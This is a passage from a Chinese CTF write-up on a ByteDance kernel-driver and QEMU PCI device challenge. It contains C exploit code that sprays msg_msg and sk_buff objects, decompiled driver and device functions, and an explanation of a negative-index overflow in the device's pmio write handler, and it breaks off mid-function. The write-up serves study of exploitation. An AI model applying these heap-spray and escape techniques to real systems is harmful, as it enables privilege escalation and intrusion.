class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">             <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">             <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">write(fd, buf, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>上述代码就是产生漏洞利用条件的攻击代码片段。</p><h2 id="QEMU分析"><a href="#QEMU分析" class="headerlink" title="QEMU分析"></a>QEMU分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_driver</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pci_device_id</span> *<span class="title">id_table</span>;</span> </span><br><span class="line">        <span class="keyword">int</span>  (*probe)  (struct pci_dev *dev, <span class="keyword">const</span> struct pci_device_id *id);   <span class="comment">/* New device inserted */</span></span><br><span class="line">        <span class="keyword">void</span> (*remove) (struct pci_dev *dev);   <span class="comment">/* Device removed (NULL if not a hot-plug capable driver) */</span></span><br><span class="line">        <span class="keyword">int</span>  (*suspend) (struct pci_dev *dev, <span class="keyword">pm_message_t</span> state);      <span class="comment">/* Device suspended */</span></span><br><span class="line">        <span class="keyword">int</span>  (*suspend_late) (struct pci_dev *dev, <span class="keyword">pm_message_t</span> state);</span><br><span class="line">        <span class="keyword">int</span>  (*resume_early) (struct pci_dev *dev);</span><br><span class="line">        <span class="keyword">int</span>  (*resume) (struct pci_dev *dev);                   <span class="comment">/* Device woken up */</span></span><br><span class="line">        <span class="keyword">void</span> (*shutdown) (struct pci_dev *dev);</span><br><span class="line">        <span class="keyword">int</span> (*sriov_configure) (struct pci_dev *dev, <span class="keyword">int</span> num_vfs); <span class="comment">/* PF pdev */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pci_error_handlers</span> *<span class="title">err_handler</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device_driver</span>    <span class="title">driver</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pci_dynids</span> <span class="title">dynids</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先使用<code>_pci_register_driver</code>函数注册一个设备驱动，上述就是对应的结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000001E00 00                            bytedev_driver db    0                  ; DATA XREF: init_module+132↑o</span><br><span class="line">.data:0000000000001E00                                                                       ; cleanup_module+2B↑o</span><br><span class="line">.data:0000000000001E01 00                            db    0</span><br><span class="line">.data:0000000000001E02 00                            db    0</span><br><span class="line">.data:0000000000001E03 00                            db    0</span><br><span class="line">.data:0000000000001E04 00                            db    0</span><br><span class="line">.data:0000000000001E05 00                            db    0</span><br><span class="line">.data:0000000000001E06 00                            db    0</span><br><span class="line">.data:0000000000001E07 00                            db    0</span><br><span class="line">.data:0000000000001E08 00                            db    0</span><br><span class="line">.data:0000000000001E09 00                            db    0</span><br><span class="line">.data:0000000000001E0A 00                            db    0</span><br><span class="line">.data:0000000000001E0B 00                            db    0</span><br><span class="line">.data:0000000000001E0C 00                            db    0</span><br><span class="line">.data:0000000000001E0D 00                            db    0</span><br><span class="line">.data:0000000000001E0E 00                            db    0</span><br><span class="line">.data:0000000000001E0F 00                            db    0</span><br><span class="line">.data:0000000000001E10 03 0C 00 00 00 00 00 00       dq offset aBytedev                      ; &quot;bytedev&quot;</span><br><span class="line">.data:0000000000001E18 00 13 00 00 00 00 00 00       dq offset bytedev_ids</span><br><span class="line">.data:0000000000001E20 95 06 00 00 00 00 00 00       dq offset bytedev_pci_probe</span><br><span class="line">.data:0000000000001E28 C0 00 00 00 00 00 00 00       dq offset bytedev_pci_remove</span><br></pre></td></tr></table></figure><p>在内存中就是这样，在注册函数中会调用<code>bytedev_pci_probe</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_pci_probe</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// r12d</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v12[<span class="number">14</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v1 = <span class="number">-12</span>;</span><br><span class="line">  v12[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_DC8);</span><br><span class="line">  v3 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">2</span>], <span class="number">0xDC0</span>LL, <span class="number">0xB8</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(a1 + <span class="number">0x148</span>) = v3;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v1 = pci_enable_device(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_DF8);</span><br><span class="line">LABEL_31:</span><br><span class="line">      kfree(v4);</span><br><span class="line">      <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(a1 + <span class="number">0x3D1</span>) &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-19</span>;</span><br><span class="line">      printk(&amp;unk_E28);</span><br><span class="line">LABEL_30:</span><br><span class="line">      pci_disable_device(a1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(a1 + <span class="number">0x411</span>) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-19</span>;</span><br><span class="line">      printk(&amp;unk_E70);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = pci_request_regions(a1, <span class="string">&quot;ByteDance-CTFDevice&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_EB8);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = pci_ioremap_bar(a1, <span class="number">0LL</span>);</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">0x18</span>) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-12</span>;</span><br><span class="line">      printk(&amp;unk_EE0);</span><br><span class="line">LABEL_29:</span><br><span class="line">      pci_release_regions(a1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">0x20</span>) = *(_QWORD *)(a1 + <span class="number">0x3F8</span>);</span><br><span class="line">    raw_spin_lock(&amp;bytedev_lock_minor_num);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">0x100</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i;</span><br><span class="line">      <span class="keyword">if</span> ( !bytedev_minor_num[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        bytedev_minor_num[(<span class="keyword">int</span>)i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = <span class="number">-1</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">    raw_spin_unlock(&amp;bytedev_lock_minor_num);</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_F08);</span><br><span class="line">LABEL_28:</span><br><span class="line">      pci_iounmap(a1, *(_QWORD *)(v4 + <span class="number">24</span>));</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)v12, <span class="number">0x40</span>uLL, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;bytedev&quot;</span>, v7);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12[<span class="number">0</span>] = <span class="number">0x76656465747962</span>LL;</span><br><span class="line">    v8 = device_create(bytedev_class, <span class="number">0LL</span>, v7 | (bytedev_major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, v12);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = v8;</span><br><span class="line">      printk(&amp;unk_F30);</span><br><span class="line">      bytedev_set_unused_minor_num(v7);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="number">32LL</span>;</span><br><span class="line">    v10 = (_DWORD *)(v4 + <span class="number">48</span>);</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v10++ = <span class="number">0</span>;</span><br><span class="line">      --v9;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">8</span>) = a1;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">176</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *(_QWORD *)v4 = v8;</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">16</span>) = v7;</span><br><span class="line">    bytedev_arr[v7] = v4;</span><br><span class="line">    printk(&amp;unk_F60);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数中使用了<code>pci_request_regions</code>对资源进行了探测和占用，导致如果直接使用用户态程序对PCI设备使用时会失败，<strong>这里如果提权成功的话可以通过卸载驱动模块来实现取消对资源的占用从而可以直接在用户态使用PCI设备。</strong>不过题目这里的驱动中已经完全包含了对PCI设备的使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> a3; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v8; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1919810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(_QWORD *)(v4 + <span class="number">0x20</span>);</span><br><span class="line">      v8 = __indword(v7);</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        __outdword(v7 + <span class="number">1</span>, a3);</span><br><span class="line">        v6 = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">-14LL</span>;</span><br><span class="line">        printk(&amp;unk_CE8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">-14LL</span>;</span><br><span class="line">      printk(&amp;unk_BD1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">0x7C0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(v5 + <span class="number">4</span>) &amp;&amp; !*(_DWORD *)(v5 + <span class="number">0x14</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    __outdword(*(_QWORD *)(v4 + <span class="number">0x20</span>), a3);</span><br><span class="line">    v6 = <span class="number">0LL</span>;</span><br><span class="line">    printk(&amp;unk_CC0);</span><br><span class="line">LABEL_8:</span><br><span class="line">    raw_spin_unlock(v4 + <span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bytedev_ioctl_cold_12();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这里如果你想要使用PCI设备那么你必须保证一点的是<code>ds_0-&gt;regs.mode = 1</code>，因为所有地方都存在这个验证，所以我们首先就需要使用ioctl中<code>__outdword(*(_QWORD *)(v4 + 0x20), a3);</code>语句。这里最好动调一下查看一下<code>*(_QWORD *)(v4 + 0x20)</code>和<code>(unsigned int)&amp;current_task) + 0x7C0</code>到底是什么，结果会发现这里实际就是供我们修改<code>ds_0-&gt;regs.mode</code>的已经会验证当前是否为root权限。</p><h3 id="函数分析-1"><a href="#函数分析-1" class="headerlink" title="函数分析"></a>函数分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BYTEPCIDevState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 parent_obj;</span><br><span class="line">  BYTEPCIDevRegs_0 regs;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">char</span> *blk_mem[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是先给一下结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">byte_dev_pmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> blk_idx; <span class="comment">// ebx</span></span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">0xA3</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _mm_mfence();</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.blk_status != <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.mode == <span class="number">1</span> &amp;&amp; (<span class="keyword">int</span>)val &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;regs.blk_idx = val;</span><br><span class="line">        ds_0-&gt;regs.blk_status = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx] )</span><br><span class="line">        &#123;</span><br><span class="line">          blk_idx = ds_0-&gt;regs.blk_idx;</span><br><span class="line">          ds_0-&gt;blk_mem[blk_idx] = (<span class="keyword">char</span> *)g_malloc(<span class="number">0x200</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        ds_0-&gt;regs.blk_status = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( val &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ds_0-&gt;regs.mode = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在qemu中的漏洞就出现在这样一个函数中，在对val的类型为int类型，所以可以为负数因为<code>blk_mem</code>为结构体中的一个成员导致可以向上进行溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">byte_dev_mmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">107</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.mode == <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.blk_status == <span class="number">2</span> &amp;&amp; size + addr &lt;= <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( size == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_WORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( size &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( size == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span 